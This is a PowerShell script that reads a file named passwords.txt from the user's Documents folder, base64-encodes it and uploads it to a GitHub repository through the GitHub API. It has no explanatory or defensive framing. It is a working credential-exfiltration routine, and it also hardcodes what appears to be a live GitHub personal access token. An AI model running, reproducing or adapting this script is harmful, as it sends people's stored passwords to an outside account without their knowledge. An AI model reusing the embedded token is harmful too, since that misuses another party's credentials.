# Define variables
$RepoOwner = "tomasgit17"
$RepoName = "tomasgit17/files"
$FilePath = "$env:USERPROFILE\Documents\passwords.txt"
$GitHubToken = "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"

# Convert file to Base64
$FileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
$FileName = [System.IO.Path]::GetFileName($FilePath)

# Define API URL
$ApiUrl = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$FileName"

# Check if file already exists (Get latest commit SHA)
$Headers = @{
    Authorization = "Bearer $GitHubToken"
    Accept = "application/vnd.github.v3+json"
}

$ExistingFile = Invoke-RestMethod -Uri $ApiUrl -Headers $Headers -Method Get -ErrorAction SilentlyContinue

# If file exists, get the SHA to update it
$Sha = if ($ExistingFile) { $ExistingFile.sha } else { $null }

# Create the request body
$Body = @{
    message = "Uploading $FileName via PowerShell"
    content = $FileContent
    sha = $Sha
} | ConvertTo-Json -Depth 10

# Upload file using GitHub API
$response = Invoke-RestMethod -Uri $ApiUrl -Headers $Headers -Method Put -Body $Body

Write-Output "File uploaded successfully! URL: $($response.content.html_url)"
